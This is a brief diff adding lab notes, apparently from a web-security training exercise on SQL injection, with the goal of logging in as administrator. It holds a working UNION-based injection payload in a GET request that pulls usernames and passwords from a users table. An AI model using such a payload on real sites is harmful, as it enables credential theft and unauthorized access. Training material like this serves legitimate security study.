@@ -1,0 +1,11 @@
+Retrieving multiple values within a single column
+
+End Goals:
+- Login as the administrator user
+
+Analysis:
+1. Find the number of columns
+2. Find the data type of the columns
+
+GET /filter?category=Gifts'union+select+null,username|| '~' ||password+from+users--
+
